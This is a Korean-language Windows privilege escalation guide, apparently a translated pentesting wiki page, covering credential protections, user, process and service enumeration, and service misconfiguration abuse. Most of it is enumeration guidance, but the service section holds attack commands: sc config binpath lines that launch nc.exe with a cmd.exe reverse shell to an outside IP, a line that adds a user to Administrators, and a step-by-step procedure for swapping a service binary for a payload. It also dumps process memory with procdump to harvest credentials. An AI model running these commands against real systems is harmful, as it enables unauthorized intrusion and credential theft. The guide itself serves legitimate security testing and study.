**LAPS**는 도메인에 가입된 컴퓨터의 **로컬 Administrator 비밀번호를 관리**하기 위한 기능으로, 각 비밀번호가 **고유하고 무작위로 생성되며 정기적으로 업데이트**되도록 합니다. 이러한 비밀번호는 Active Directory에 안전하게 저장되며, ACL을 통해 충분한 권한을 부여받은 사용자만 액세스할 수 있으므로 권한이 있는 경우 로컬 admin 비밀번호를 확인할 수 있습니다.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

활성화된 경우 **일반 텍스트 비밀번호가 LSASS**(Local Security Authority Subsystem Service)에 저장됩니다.\
[**이 페이지에서 WDigest에 대해 자세히 알아보세요**](../stealing-credentials/credentials-protections.md#wdigest).

```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```

### LSA Protection

**Windows 8.1**부터 Microsoft는 Local Security Authority(LSA)에 대한 향상된 보호 기능을 도입해 신뢰할 수 없는 프로세스가 **메모리를 읽거나** 코드를 삽입하려는 시도를 **차단**하여 시스템 보안을 강화했습니다.\
[**LSA Protection에 대한 자세한 정보**](../stealing-credentials/credentials-protections.md#lsa-protection).

```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```

### Credentials Guard

**Credential Guard**는 **Windows 10**에서 도입되었습니다. 이 기능은 pass-the-hash 공격과 같은 위협으로부터 장치에 저장된 자격 증명을 보호합니다. [**Credential Guard에 관한 자세한 정보는 여기에서 확인할 수 있습니다.**](../stealing-credentials/credentials-protections.md#credential-guard)

```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```

### 캐시된 자격 증명

**도메인 자격 증명**은 **Local Security Authority**(LSA)에서 인증하며 운영 체제 구성 요소에서 사용됩니다. 사용자의 로그온 데이터가 등록된 보안 패키지에서 인증되면 일반적으로 해당 사용자의 도메인 자격 증명이 설정됩니다.\
[**캐시된 자격 증명에 대한 자세한 정보**](../stealing-credentials/credentials-protections.md#cached-credentials).

```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```

## 사용자 및 그룹

### 사용자 및 그룹 열거

자신이 속한 그룹 중 권한이 흥미로운 그룹이 있는지 확인해야 합니다.

```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```

### 권한이 높은 그룹

**권한이 높은 그룹에 속해 있다면 권한을 상승할 수 있습니다**. 권한이 높은 그룹과 해당 그룹을 악용해 권한을 상승하는 방법은 여기에서 알아보세요:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Token 조작

이 페이지에서 **token**이 무엇인지 **자세히 알아보세요**: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
다음 페이지에서 **흥미로운 token**과 이를 악용하는 방법을 알아보세요:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### 로그인한 사용자 / 세션

```bash
qwinsta
klist sessions
```

### 홈 폴더ler

```bash
dir C:\Users
Get-ChildItem C:\Users
```

### 비밀번호 정책

```bash
net accounts
```

### 클립보드 내용 가져오기

```bash
powershell -command "Get-Clipboard"
```

## 실행 중인 프로세스

### 파일 및 폴더 권한

먼저, 프로세스 목록을 확인해 **프로세스의 명령줄에 비밀번호가 포함되어 있는지 확인하세요**.\
실행 중인 바이너리를 **덮어쓸 수 있는지** 또는 바이너리가 있는 폴더에 쓰기 권한이 있는지 확인해, 가능한 [**DLL Hijacking attacks**](dll-hijacking/index.html)을 악용하세요:

```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```

Always check for possible [**electron/cef/chromium debuggers** running, 이를 악용해 권한을 상승시킬 수 있습니다](../../linux-hardening/software-information/electron-cef-chromium-debugger-abuse.md).

debugger listener는 잠깐만 열려 있을 수 있으므로, 한 번의 passive port snapshot에서 확인되지 않았다고 해서 이전에도 노출된 적이 없었다고 단정할 수는 없습니다. 관찰된 listener가 있다면 해당 listener의 PID, 프로세스 소유자, 낮은 권한의 사용자가 접근할 수 있는지 함께 확인하세요. 애플리케이션 이름이나 debug flag만으로는 사용자 간 code execution이 가능하다고 볼 수 없습니다. 일상적인 열거는 passive하게 수행하고 debugger 명령은 보내지 마세요.

**프로세스 바이너리의 권한 확인**

```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
	for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
		icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
	)
)
```

**프로세스 바이너리가 있는 폴더의 권한 확인 (**[**DLL Hijacking**](dll-hijacking/index.html)**)****

```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
	icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```

### Snort dynamic preprocessor 디렉터리

Snort 2는 `snort.exe -c <config>`로 선택한 구성에 선언된 `dynamicpreprocessor directory`에서 공유 라이브러리를 로드할 수 있습니다. 다른 계정으로 Snort를 실행하는 예약된 작업이나 서비스의 경우, 해당 구성 파일과 선언된 모듈 디렉터리의 ACL을 확인하세요. 토큰으로 해당 디렉터리에 파일을 만들 수 있다면, 다음에 작업이나 서비스가 모듈을 로드할 때 코드 실행이 가능한지 검토할 후보 경로입니다. 실행 계정의 유효 권한, 활성 구성, 모듈 호환성, 거부 또는 공유 제한을 확인하세요. 디렉터리에 쓰기 권한이 있다는 사실만으로 권한 상승이 입증되지는 않습니다. [Snort의 dynamic-preprocessor 문서](https://www.snort.org/documents/dpx-readme)에서 런타임 모듈 로드에 대해 설명합니다.

### 쓰기 가능한 document root가 있는 권한 높은 웹 서비스

Windows Apache 설치에서 서비스 실행 파일 경로와 실행 계정을 활성 `httpd.conf`의 `DocumentRoot`와 비교하세요. 일반적인 XAMPP 배치의 경우 `C:\xampp\apache\conf\httpd.conf`와 구성된 document root의 ACL을 확인하세요. document root는 흔히 `C:\xampp\htdocs`입니다. 낮은 권한의 사용자가 해당 root에 파일을 만들 수 있고 Apache가 `LocalSystem`으로 실행 중이라면, 서버 측 코드 실행으로 호스트의 권한 경계를 넘을 수 있습니다. 서비스가 실행 중인지, 정확한 경로가 제공되는지, 서버 측 핸들러가 해당 파일 형식을 처리하는지 확인하세요. root에 쓰기 가능하다는 사실만으로 입증되는 것은 파일 생성뿐입니다. probe를 작성하지 말고 ACL을 확인하세요:

```powershell
Get-CimInstance Win32_Service -Filter "Name='Apache2.4'" | Select-Object Name, State, StartName, PathName
Select-String -Path 'C:\xampp\apache\conf\httpd.conf' -Pattern '^\s*DocumentRoot\s+'
icacls 'C:\xampp\htdocs'
```

일반적인 WAMP 설치에서 서비스는 버전이 포함된 `C:\wamp64\bin\apache\apache*\bin\httpd.exe`(32비트 구성에서는 `C:\wamp\...`)를 가리키며, 설정 파일은 그 옆의 `conf\httpd.conf`에, 기본 루트는 `C:\wamp64\www` 또는 `C:\wamp\www`에 있을 수 있습니다. 정확한 서비스 이미지 경로, 실행 계정, 유효한 `DocumentRoot`(`${INSTALL_DIR}` 확장 및 가상 호스트 재정의 포함), 루트 ACL을 함께 확인하세요. WAMP 디렉터리에 쓰기 권한이 있다고 해서 Apache가 `SYSTEM`으로 실행되거나 제출한 파일을 실행한다는 뜻은 아닙니다. [Apache 문서에서는 Windows 서비스가 설정 파일을 선택하는 방식을 설명합니다](https://httpd.apache.org/docs/2.4/platform/windows.html#winnt-service).

### 쓰기 가능한 IIS 루트 및 애플리케이션 풀의 네트워크 ID

IIS에서는 `applicationHost.config`에서 쓰기 가능한 물리 디렉터리가 **활성 사이트/애플리케이션**에 매핑되는지 확인한 다음, 해당 디렉터리에 설정된 풀과 서버 측 핸들러를 파악하세요. 제공되는 디렉터리에 놓인 코드는 IIS가 해당 파일 형식을 처리하고 요청 경로에 접근할 수 있을 때만 풀의 권한으로 실행됩니다. 쓰기 가능한 디렉터리를 코드 실행 경로로 판단하기 전에 현재 사용자의 실효 파일 생성 권한, 사이트의 실행 상태, 핸들러, 경로별 재정의를 확인하세요.

ASP.NET 동적 컴파일도 별도로 검토해야 합니다. 애플리케이션의 컴파일 디렉터리 아래에 파일이 생성되기 때문입니다. 기본 위치는 관련 .NET Framework 설치 디렉터리 아래의 `Temporary ASP.NET Files` 디렉터리지만, 애플리케이션의 `<compilation tempDirectory>` 설정으로 변경할 수 있습니다. [Microsoft 문서에서는 위치와 애플리케이션별 하위 디렉터리를 설명하며](https://learn.microsoft.com/en-us/previous-versions/aspnet/ms366723%28v%3Dvs.100%29), [애플리케이션 풀이 서로를 신뢰하지 않는 경우 컴파일 디렉터리를 격리할 것을 권장합니다](https://learn.microsoft.com/en-us/iis/manage/creating-websites/provisioning-iis-7-sites-for-shared-hosting#configuring-aspnet-temporary-compilation-directories). 권한이 낮은 토큰으로 **특정** 애플리케이션의 캐시에 있는 생성된 소스를 변경할 수 있다면, 해당 애플리케이션이 이를 더 높은 권한의 [worker-process identity](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities)로 다시 컴파일하는지 확인하세요. 파일이나 디렉터리의 ACL만으로는 코드 실행이 입증되지 않습니다. 캐시가 활성 애플리케이션과 연관되는지, 실효 토큰과 ACL, 컴파일 설정, 프로세스 ID, 재컴파일 시점을 함께 확인하세요. 읽기 전용 메타데이터를 검토하고, 열거 중에는 컴파일을 유발하거나 캐시 파일을 변경하지 마세요.

`ApplicationPoolIdentity` 또는 `NetworkService`로 설정된 IIS 풀은 로컬 토큰의 권한이 낮더라도 일반적으로 **호스트 컴퓨터 계정**으로 도메인 리소스에 인증합니다. `LocalSystem`은 로컬에서 이미 높은 권한을 가지며 네트워크에서도 컴퓨터 계정을 사용합니다. `LocalService`는 보통 익명 네트워크 자격 증명을 사용합니다. `SpecificUser` 풀은 설정된 계정을 사용합니다. [Microsoft 문서에서는 이러한 ID 유형을 설명하며](https://learn.microsoft.com/en-us/iis/configuration/system.applicationhost/applicationpools/add/processmodel), [애플리케이션 풀의 네트워크 ID도 설명합니다](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities). ID 설정을 생략하면 풀 기본값을 상속할 수 있으며, 기본값은 IIS 세대에 따라 다르므로 풀 이름만 보고 추측하지 말고 유효한 설정을 확인하세요. 코드 실행이 컴퓨터 계정 네트워크 ID를 사용하는 풀에 도달하면 **해당 컴퓨터**의 디렉터리 권한을 평가하세요. [DCSync](../active-directory-methodology/dcsync.md)에는 도메인 명명 컨텍스트에 대한 복제 권한이 필요합니다. 머신 계정 티켓이나 호스트 역할만으로는 그 권한이 입증되지 않습니다. 수동 열거에서는 파일을 업로드하거나, 네트워크 인증을 수행하거나, 티켓을 요청하지 말고 설정과 ACL을 검사하세요.

도우미 프로세스를 시작하는 읽기 가능한 ASP.NET 핸들러의 경우, 요청에서 비롯된 값이 인증, 복호화, 검증 및 명령 구성 과정을 거치는 경로를 추적하세요. 디코딩된 토큰을 `ProcessStartInfo("cmd", "/c ...")`에 연결하는 핸들러는 셸 메타문자를 통해 명령을 바꿀 수 있습니다. [Microsoft 문서에서는 `cmd`의 특수 문자를 설명합니다](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/cmd). 신뢰할 수 없는 호출자가 실제로 디코딩된 값에 영향을 줄 수 있고 핸들러에 도달할 수 있는지 확인한 다음, 유효한 애플리케이션 풀 ID나 가장된 ID, 자식 프로세스의 ID를 파악하세요. 소스 코드 한 줄, localhost 리스너 또는 토큰 형식의 취약성만으로는 권한 있는 명령 실행이 입증되지 않습니다. 수동 열거 중에는 위조된 요청을 보내거나 도우미를 실행하지 말고 소스와 풀 설정을 검토하세요.

Windows의 PHP 서비스에서는 요청으로 제어되는 경로를 [`include` 또는 `require`](https://www.php.net/manual/en/function.include.php)에 전달하면 작업자 ID로 권한이 낮은 사용자가 쓸 수 있는 PHP 파일을 평가할 수 있습니다. 요청이 해당 구문에 도달할 수 있는지, 확인된 경로가 권한이 낮은 사용자가 수정할 수 있고 작업자가 읽을 수 있는 파일인지, 적용되는 PHP 경로 제한이 include를 허용하는지, 작업자가 실제로 더 높은 권한으로 실행되는지 확인하세요. 루프백 리스너나 쓰기 가능한 파일만으로는 이 연결이 성립한다고 볼 수 없습니다. 수동 열거 중에는 엔드포인트를 호출하지 말고 소스, 서비스 ID, 파일 ACL을 검사하세요.

### 메모리에서 Password 마이닝

Sysinternals의 **procdump**를 사용하면 실행 중인 프로세스의 메모리 덤프를 만들 수 있습니다. FTP 같은 서비스는 **메모리에 자격 증명을 평문으로 보관**할 수 있으므로, 메모리를 덤프해 자격 증명을 확인해 보세요.

```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```

### 안전하지 않은 GUI 앱

**SYSTEM으로 실행되는 애플리케이션은 사용자가 CMD를 실행하거나 디렉터리를 탐색할 수 있게 할 수 있습니다.**

예: "Windows 도움말 및 지원" (Windows + F1)에서 "command prompt"를 검색하고 "Click to open Command Prompt"를 클릭합니다.

### 권한이 있는 프로젝트 파일 가져오기

낮은 권한 사용자가 쓸 수 있는 드롭 디렉터리에서 프로젝트를 자동으로 여는 애플리케이션은 가져오기 도구의 계정으로 입력 신뢰 경계를 넘습니다. **정확한 쓰기 가능 경로**, 해당 경로를 여는 프로세스나 작업, 유효한 ID, 파서 빌드를 검토하세요. [과거 Ghidra 프로젝트 열기/복원 문제](https://github.com/NationalSecurityAgency/ghidra/issues/71)로 인해 프로젝트 메타데이터의 XML external entity가 허용되었습니다. [아웃바운드 SMB 및 NTLM 정책](https://learn.microsoft.com/en-us/windows-server/storage/file-server/smb-ntlm-blocking)이 허용하면 Windows에서 네트워크 entity를 통해 가져오기 계정의 인증이 발생할 수 있습니다. 이는 자격 증명 노출 가능성을 시사할 뿐, 즉각적인 관리자 권한 획득을 뜻하지는 않습니다. 응답을 활용하려면 별도의 승인된 경로나 취약한 경로가 필요하며, 현재 빌드의 실제 패치 상태를 확인해야 합니다. 수동 열거 중에는 조작된 프로젝트를 열지 마세요. 가져오기 워크플로와 ACL을 검사하세요.

## 서비스

Service Control Manager (SCM) 객체의 [`SC_MANAGER_CREATE_SERVICE` 권한](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights)은 기존 서비스에 대한 권한과 별개입니다. 해당 권한에 대해 읽기 전용 [`OpenSCManager` 액세스 요청](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-openscmanagerw)이 성공하면 검토할 단서가 되지만, 새 서비스를 실행할 수 있다는 증거는 아닙니다. [`CreateService`는 핸들을 반환합니다](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-createservicew). 이 핸들에는 생성 시 요청한 서비스 액세스 권한이 부여됩니다. 나중에 서비스를 다시 열면 별도의 액세스 검사가 수행되므로, 원래 핸들을 사용할 수 있어도 실패할 수 있습니다. 유효한 로컬 또는 원격 토큰, 허용된 핸들 권한, 서비스 계정, 시작 정책, 실행 파일 경로를 각각 확인하세요. 수동 열거 중에는 서비스를 만들거나 시작하지 마세요.

원격 서비스 설치 경로를 검토할 때는 해당 SCM 권한을 대상의 공유 폴더와 대조하세요. **동일한 네트워크 로그온**으로 해당 공유 폴더에 쓸 수 있어야 하며, 기반이 되는 NTFS ACL과 서비스 계정이 실행할 수 있는 로컬 실행 파일 경로도 확인해야 합니다. SCM 권한이 이례적으로 넓고 파일 배치 경로도 확보된 경우, 관리자 계정이 아닌 계정도 이 경계를 넘을 수 있습니다. 관리 공유는 반드시 필요한 조건이 아닙니다. 공유 폴더 쓰기 권한만 있거나 SCM에서 서비스 생성이 가능하다는 단서만으로는 새 서비스가 더 높은 권한으로 시작될 수 있다고 볼 수 없습니다.

기존 서비스는 `ImagePath`에 명시되지 않은 보조 실행 파일을 시작, 종료 또는 다른 수명 주기 이벤트에서 호출할 수 있습니다. 보조 파일 이름이 낮은 권한 사용자가 쓸 수 있는 디렉터리에서 해석되고 서비스가 더 높은 권한으로 실행된다면, 누락된 보조 파일은 조건부 교체 후보가 될 수 있습니다. **실제 서비스 코드 또는 문서화된 보조 프로그램 호출**, 해석된 실행 파일 경로와 검색 순서, 디렉터리 생성 권한, 서비스 ID, 사용 가능한 수명 주기 트리거를 확인하세요. 서비스 디렉터리를 쓸 수 있거나 파일이 누락되었다는 사실만으로 서비스가 해당 파일을 불러온다고 단정할 수 없습니다. 수동 검토 중에는 서비스를 시작하거나 중지하지 마세요.

기존 서비스에서 [`SERVICE_START`를 사용하면 `StartService`에 인수를 전달할 수 있습니다](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-startservicew). 이는 [`SERVICE_CHANGE_CONFIG`](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights)와 별개입니다. 시작 권한을 단순한 제어 권한 이상으로 간주하기 전에 서비스 코드나 문서화된 인터페이스를 검토하세요. 호출자가 선택한 인수를 로그 또는 내보내기 경로로 사용한다면 서비스 ID, 인수에서 쓰기 작업으로 이어지는 정확한 흐름, 경로 제한, **생성된 파일**의 권한을 확인하세요. 보호된 디렉터리에 쓰기가 가능하더라도, 해당 파일을 사용하는 별도의 권한 있는 소비자나 로더가 있어야 권한 상승으로 이어질 수 있습니다. 쓰기 가능한 로그나 시작 권한만으로는 충분하지 않습니다. 수동 인벤토리 중에는 서비스를 시작하거나 테스트 파일을 만들지 마세요.

NSClient++ 모니터링 에이전트에서 읽을 수 있는 `nsclient.ini`는 **설정 검토 단서**입니다. 웹 자격 증명이 들어 있을 수 있으며, `boot.ini`가 다른 위치의 설정 파일을 지정할 수도 있습니다. 실제 서비스 계정, WEB listener 및 액세스 정책, 인증된 역할이 설정이나 스크립트를 변경할 수 있는지 확인하세요. 권한 있는 실행에는 추가로 `CheckExternalScripts`(또는 다른 활성화된 실행 경로), 명령을 등록하거나 수정할 실효 권한, 서비스 ID로 실행되도록 하는 트리거가 필요합니다. loopback 전용 listener도 로컬 사용자가 접근할 수 있지만, 파일 경로, 암호 또는 listener만으로는 필요한 권한이 입증되지 않습니다. 수동 열거 중에는 비밀 값을 표시하거나 웹 API를 호출하지 말고 메타데이터와 권한을 검토하세요. [NSClient++ 파일 레이아웃](https://nsclient.org/docs/concepts/file-layout/), [웹 및 스크립트 보안 지침](https://nsclient.org/docs/setup/securing/), [외부 스크립트 설정](https://nsclient.org/docs/reference/check/CheckExternalScripts/)을 참조하세요.

`ImagePath`가 `nssm.exe`인 서비스에서는 실제 실행 계정과 `HKLM\SYSTEM\CurrentControlSet\Services\<name>\Parameters\Application` 값을 확인하세요. [NSSM은 자식 애플리케이션을 해당 위치에 저장합니다](https://git.nssm.cc/nssm/nssm/src/96e7f4484a3dc962482c240909fd52b0e0226a60/registry.h). `AppDirectory`는 설정된 작업 디렉터리입니다. 래퍼의 권한만으로 서비스 경계를 판단하기 전에 자식 실행 파일과 상위 디렉터리의 ACL을 확인하세요. 해당 자식이 노출하는 로컬 WCF 또는 SOAP endpoint는 별도의 검토 단서입니다. 낮은 권한 사용자가 listener에 접근할 수 있는지, 정확한 작업이 해당 사용자의 입력을 받는지, 서비스 자식이 더 높은 권한으로 안전하지 않은 작업을 실행하는지 확인하세요. 서비스 계정, endpoint URL 또는 쓰기 가능한 경로만으로는 권한 상승이 입증되지 않습니다. 수동 열거 중에는 서비스 작업을 호출하지 마세요.

사용자 지정 WCF 작업에서는 호출자가 제어하는 문자열이 PowerShell runspace에 전달되는지 추적하세요. [`Pipeline.Commands.AddScript`는 스크립트 텍스트를 추가합니다](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.runspaces.commandcollection.addscript). [`Pipeline.Invoke`는 파이프라인을 실행합니다](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.runspaces.pipeline.invoke). [Windows 전송 자격 증명을 사용하는 `netTcpBinding`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/wcf/transport-of-nettcpbinding)은 클라이언트를 인증하지만, **특정** 작업을 호출할 권한과 runspace의 유효 ID는 별도로 확인해야 합니다. 낮은 권한 호출자의 입력에서 더 높은 권한의 서비스 ID로 실행되는 `AddScript`까지 이어지는 경로는 코드 실행 경계입니다. listener 포트, 인증된 클라이언트 또는 관련 없는 어셈블리의 사용되지 않는 메서드만으로는 이를 입증할 수 없습니다. 열거 중에는 endpoint를 호출하지 말고 배포된 서비스, contract, 권한 부여 및 impersonation 설정을 정적으로 검토하세요.

Service Triggers를 사용하면 특정 조건(명명된 pipe/RPC endpoint 활동, ETW 이벤트, IP 사용 가능 여부, 장치 연결, GPO 새로 고침 등)이 발생했을 때 Windows가 서비스를 시작할 수 있습니다. SERVICE_START 권한이 없어도 트리거를 발생시켜 권한 있는 서비스를 시작할 수 있는 경우가 많습니다. 열거 및 활성화 기법은 여기에서 확인하세요.

-
{{#ref}}
service-triggers.md
{{#endref}}

### Visual Studio 진단 수집기 서비스

C/C++ 도구가 포함된 Visual Studio 설치에는 `VSStandardCollectorService150`이 포함될 수 있으며, 이 진단 서비스는 `LocalSystem`으로 실행되도록 설정되어 있습니다. [CVE-2024-20656](https://www.mdsec.co.uk/2024/01/cve-2024-20656-local-privilege-escalation-in-vsstandardcollectorservice150-service/)은 junction 및 object-manager-link race를 이용해 서비스 DACL 재설정을 리디렉션했습니다. 시연된 권한 상승에는 사용 가능한 Visual Studio Setup WMI Provider MSI 복구 경로와 `C:\ProgramData\Microsoft\VisualStudio\SetupWMI\MofCompiler.exe` 대상도 필요했습니다. 해당 구성 요소는 2024년 1월에 수정되었습니다.

수동 초기 분류에서는 해당 서비스의 계정과 바이너리 경로를 확인하고, Setup WMI 컴파일러 경로의 존재 여부 및 설치된 구성 요소의 패치 상태를 확인하세요. 서비스 항목, Visual Studio 제품 버전 또는 컴파일러 파일만으로는 호스트가 취약하다고 볼 수 없습니다. 검사 과정에서 서비스를 시작하거나 복구를 실행할 필요는 없습니다.

서비스 목록을 확인합니다:

```bash
net start
wmic service list brief
sc query
Get-Service
```

### 권한

**sc**를 사용해 서비스 정보를 확인할 수 있습니다.

```bash
sc qc <service_name>
```

각 서비스에 필요한 권한 수준을 확인하려면 _Sysinternals_의 **accesschk** 바이너리를 사용하는 것이 좋습니다.

```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```

"Authenticated Users"가 서비스를 수정할 수 있는지 확인하는 것이 좋습니다:

```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```

[XP용 accesschk.exe는 여기에서 다운로드할 수 있습니다](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### 서비스 활성화

(예를 들어 SSDPSRV에서) 다음 오류가 발생하는 경우:

_시스템 오류 1058이 발생했습니다._\
_서비스가 비활성화되어 있거나 연결된 활성화된 장치가 없어서 서비스를 시작할 수 없습니다._

다음 명령을 사용하여 서비스를 활성화할 수 있습니다.

```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```

**서비스 upnphost가 작동하려면 SSDPSRV에 의존한다는 점을 고려하세요(XP SP1의 경우)**

**이 문제의 또 다른 해결 방법**은 다음을 실행하는 것입니다:

```
sc.exe config usosvc start= auto
```

### **서비스 바이너리 경로 수정**

"Authenticated users" 그룹이 서비스에 대해 **SERVICE_ALL_ACCESS** 권한을 가진 경우, 서비스 실행 바이너리를 수정할 수 있습니다. 서비스를 수정하고 실행하려면 **sc**를 사용합니다:

```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```

### 서비스 다시 시작

```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```

권한 상승은 다양한 권한을 통해 가능합니다.

- **SERVICE_CHANGE_CONFIG**: 서비스 바이너리를 재구성할 수 있습니다.
- **WRITE_DAC**: 권한을 재구성하여 서비스 구성을 변경할 수 있습니다.
- **WRITE_OWNER**: 소유권을 획득하고 권한을 재구성할 수 있습니다.
- **GENERIC_WRITE**: 서비스 구성을 변경할 수 있는 권한을 상속합니다.
- **GENERIC_ALL**: 서비스 구성을 변경할 수 있는 권한도 상속합니다.

이 취약점을 탐지하고 악용하려면 _exploit/windows/local/service_permissions_를 사용할 수 있습니다.

### 서비스 바이너리의 취약한 권한

서비스가 **`LocalSystem`**, **`LocalService`**, **`NetworkService`** 또는 권한이 높은 도메인 계정으로 실행되지만, **권한이 낮은 사용자가 서비스 EXE 또는 상위 폴더를 수정할 수 있다면**, 대개 **바이너리를 교체하고 서비스를 다시 시작하여** 서비스를 하이재킹할 수 있습니다.

서비스가 실행하는 바이너리를 수정할 수 있는지, 또는 해당 바이너리가 있는 폴더에 대한 **쓰기 권한**이 있는지 확인하세요 ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
**wmic**(system32에 없음)를 사용하면 서비스가 실행하는 모든 바이너리를 확인할 수 있으며, **icacls**를 사용해 권한을 확인할 수 있습니다:

```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```

**sc**와 **icacls**도 사용할 수 있습니다:

```bash
sc qc <service_name>
icacls "C:\path\to\service.exe"

sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```

**`Everyone`**, **`BUILTIN\Users`** 또는 **`Authenticated Users`**에 부여된 위험한 ACL을 확인하세요. 특히 서비스 실행 파일이나 해당 파일이 있는 디렉터리에 **`(F)`**, **`(M)`**, **`(W)`** 권한이 있는지 확인하세요. 실용적인 악용 절차는 다음과 같습니다:<sup>[[27]](#references)</sup>

1. `sc qc <service_name>`으로 서비스 계정과 실행 파일 경로를 확인합니다.
2. `icacls <path>`로 바이너리에 쓰기 권한이 있는지 확인합니다.
3. 서비스 바이너리를 payload 또는 유효한 악성 서비스 바이너리로 교체합니다.
4. `sc stop <service_name> && sc start <service_name>`으로 서비스를 재시작합니다(또는 재부팅이나 서비스 트리거가 발생할 때까지 기다립니다).

유용한 자동화 검사:<sup>[[28]](#references)</sup>

```powershell
. .\PowerUp.ps1
Get-ModifiableServiceFile -Verbose

SharpUp.exe audit ModifiableServiceBinaries
. .\PrivescCheck.ps1
Invoke-PrivescCheck -Extended -Audit
```

> 서비스에서 일반 사용자의 재시작을 허용하지 않는 경우, 부팅 시 자동으로 시작되는지, 실패 시 다시 실행하는 동작이 설정되어 있는지, 또는 해당 서비스를 사용하는 애플리케이션을 통해 간접적으로 실행할 수 있는지 확인하세요.

### 서비스 레지스트리 수정 권한

서비스 레지스트리를 수정할 수 있는지 확인해야 합니다.\
서비스 **레지스트리**에 대한 **권한**은 다음과 같이 **확인**할 수 있습니다:

```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```

특정 서비스 키에 대해 **Authenticated Users** 또는 **NT AUTHORITY\INTERACTIVE**에 쓰기 권한이 있는 레지스트리 권한이 부여되어 있는지 확인하세요. ACL 항목만으로 유효한 액세스 권한이 입증되지는 않습니다. 거부 항목, 현재 토큰, 상속된 권한도 중요합니다. 레지스트리 키 권한은 서비스 객체의 `SERVICE_CHANGE_CONFIG` 및 `SERVICE_START` 권한과 별개입니다. 권한 상승을 위해서는 사용할 수 있는 서비스 구성 필드, 서비스를 트리거할 방법, 그리고 더 높은 권한을 가진 서비스 ID도 필요합니다. Microsoft의 [registry-key rights](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-key-security-and-access-rights) 및 [service access-rights reference](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights)를 참고하세요.

실행되는 바이너리의 경로를 변경하려면:

```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```

